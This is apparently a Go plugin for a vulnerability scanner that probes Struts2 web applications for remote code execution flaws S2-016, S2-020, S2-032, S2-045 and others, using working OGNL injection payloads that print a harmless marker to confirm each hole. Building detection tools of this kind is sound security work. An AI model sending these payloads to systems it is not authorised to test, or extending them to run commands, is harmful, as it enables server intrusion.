package goplugin

import (
	"net/http"
	"regexp"
	"strings"
	"vuldb/common"
	"vuldb/plugin"
)

type struts2Eval struct {
	info   common.PluginInfo
	result []common.PluginInfo
}

func init() {
	plugin.Regist("java", &struts2Eval{})
}
func (d *struts2Eval) Init() common.PluginInfo{
	d.info = common.PluginInfo{
		Name:    "Struts2 远程代码执行",
		Remarks: "可直接执行任意代码，进而直接导致服务器被入侵控制。",
		Level:   0,
		Type:    "RCE",
		Author:   "wolf",
		References: common.References{
			URL: "",
			CVE: "",
		},
	}
	return d.info
}
func (d *struts2Eval) GetResult() []common.PluginInfo {
	return d.result
}
func (d *struts2Eval) Check(URL string, meta plugin.TaskMeta) (b bool) {
	pocMap := map[string]map[string]string{
		"S2-016": map[string]string{
			// "poc": "redirect:${%23out%3D%23\u0063\u006f\u006e\u0074\u0065\u0078\u0074.\u0067\u0065\u0074(new \u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0053\u0074\u0072\u0069\u006e\u0067(\u006e\u0065\u0077\u0020\u0062\u0079\u0074\u0065[]{99,111,109,46,111,112,101,110,115,121,109,112,104,111,110,121,46,120,119,111,114,107,50,46,100,105,115,112,97,116,99,104,101,114,46,72,116,116,112,83,101,114,118,108,101,116,82,101,115,112,111,110,115,101})).\u0067\u0065\u0074\u0057\u0072\u0069\u0074\u0065\u0072(),%23\u006f\u0075\u0074\u002e\u0070\u0072\u0069\u006e\u0074\u006c\u006e(\u006e\u0065\u0077\u0020\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0053\u0074\u0072\u0069\u006e\u0067(\u006e\u0065\u0077\u0020\u0062\u0079\u0074\u0065[]{46,46,81,116,101,115,116,81,46,46})),%23\u0072\u0065\u0064\u0069\u0072\u0065\u0063\u0074,%23\u006f\u0075\u0074\u002e\u0063\u006c\u006f\u0073\u0065()}",
			"poc": "redirect:${%23out%3D%23context.get(new java.lang.String(new byte[]{99,111,109,46,111,112,101,110,115,121,109,112,104,111,110,121,46,120,119,111,114,107,50,46,100,105,115,112,97,116,99,104,101,114,46,72,116,116,112,83,101,114,118,108,101,116,82,101,115,112,111,110,115,101})).getWriter(),%23out.println(new java.lang.String(new byte[]{46,46,81,116,101,115,116,81,46,46})),%23redirect,%23out.close()}",
			"key": "QtestQ",
		},
		"S2-020": map[string]string{
			"poc": "class[%27classLoader%27][%27jarPath%27]=1024",
			"key": "No result defined for action",
		},
		"S2-DEBUG": map[string]string{
			"poc": "debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(66666687-100)):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse",
			"key": "66666587",
		},
		"S2-017": map[string]string{
			"poc": "redirect:http://www.qq.com",
			"key": "app-id=660653351",
		},
		"S2-032": map[string]string{
			"poc": "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23w%3d%23context.get(%23parameters.rpsobj[0]),%23w.getWriter().println(66666666-2),%23w.getWriter().flush(),%23w.getWriter().close(),1?%23xx:%23request.toString&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse",
			"key": "66666664",
		},
	}
	var checkURL string
	for _, url := range meta.FileList {
		if ok, _ := regexp.MatchString(`\.(do|action)$`, url); ok {
			checkURL = url
			break
		}
	}
	if checkURL == "" {
		return false
	}
	// 16->32
	for v, vul := range pocMap {
		request, err := http.NewRequest("POST", checkURL, strings.NewReader(vul["poc"]))
		request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		if err != nil {
			return false
		}
		resp, err := common.RequestDo(request, true)
		if err != nil {
			return false
		}
		if strings.Contains(resp.ResponseRaw, vul["key"]) {
			result := d.info
			result.Response = resp.RequestRaw
			result.Request = resp.ResponseRaw
			result.Remarks = v + " " + result.Remarks
			d.result = append(d.result, result)
			b = true
		}
	}
	//045
	request, err := http.NewRequest("GET", URL, nil)
	request.Header.Set("Content-Type", "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."+
		"(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2."+
		"ServletActionContext@getResponse().getWriter()).(#o.println('['+'safetest'+']')).(#o.close())}")
	if err != nil {
		return false
	}
	resp, err := common.RequestDo(request, true)
	if err != nil {
		return false
	}
	if strings.Contains(resp.ResponseRaw, "[safetest]") {
		result := d.info
		result.Response = resp.RequestRaw
		result.Request = resp.ResponseRaw
		result.Remarks = "S2-045 " + result.Remarks
		d.result = append(d.result, result)
		b = true
	}
	return b
}
